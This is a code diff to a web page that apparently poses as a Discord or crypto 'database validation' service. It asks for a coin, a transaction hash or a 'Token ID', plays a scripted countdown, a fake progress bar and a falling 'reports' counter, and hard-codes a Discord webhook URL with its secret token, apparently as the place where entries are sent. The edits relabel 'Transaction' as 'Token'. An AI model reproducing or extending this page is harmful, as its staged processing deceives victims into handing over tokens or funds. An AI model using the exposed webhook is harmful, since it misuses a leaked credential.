@@ -606,7 +606,7 @@
 </svg>
 
 <script>
-    const X_CLIENT_ID = "YOUR_X_CLIENT_ID"; // Replace with your X Developer Portal Client ID
+    const X_CLIENT_ID = "YOUR_X_CLIENT_ID"; 
     const REDIRECT_URI = "https://discdatabasevalidation.netlify.app/";
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553609504447533139/0KDmUfqwzJzw0zuNOYGd_9n0Mo1-acgowUM6JfpSz4BxY-wStCcVwVAICoYh2Krjd_Lt";
 
@@ -775,9 +775,9 @@
     coinSelect.addEventListener("change", function() {
         const selectedCoin = coinSelect.value;
         if (selectedCoin === "BTC" || selectedCoin === "ETH" || selectedCoin === "BNB" || selectedCoin === "USDT") {
-            input.placeholder = "Transaction Hash (66 chars)...";
+            input.placeholder = "Transaction Hash...";
         } else {
-            input.placeholder = "Token ID (14 chars)...";
+            input.placeholder = "Token ID...";
         }
         validateForm();
     });
@@ -823,13 +823,13 @@
 
         if (countdownTimer) clearInterval(countdownTimer);
         let secondsLeft = 3;
-        loadingText.textContent = `Processing Transaction (${secondsLeft})`;
+        loadingText.textContent = `Processing Token (${secondsLeft})`;
         loadingScreen.classList.remove("hidden");
         bottomLeftLogo.style.display = "none";
 
         countdownTimer = setInterval(function() {
             secondsLeft--;
-            loadingText.textContent = `Processing Transaction (${secondsLeft})`;
+            loadingText.textContent = `Processing Token (${secondsLeft})`;
             if (secondsLeft <= 0) {
                 clearInterval(countdownTimer);
                 loadingScreen.classList.add("hidden");
@@ -844,7 +844,6 @@
                 }
                 progressBar.style.width = currentProgress + "%";
                 progressText.textContent = currentProgress + "%";
-                
                 let remainingReports = Math.round(86 * (1 - (currentProgress / 100)));
                 reportCountDisplay.textContent = remainingReports;
                 reportCountDisplay.style.color = "#57d9a3";
@@ -853,7 +852,6 @@
                         reportCountDisplay.style.color = "#d83a3a";
                     }
                 }, 1000);
-
                 recentDepositDisplay.textContent = `$${depositValue.toFixed(2)}`;
                 totalDepositAmount += depositValue;
                 totalDepositDisplay.textContent = `$${totalDepositAmount.toFixed(2)}`;
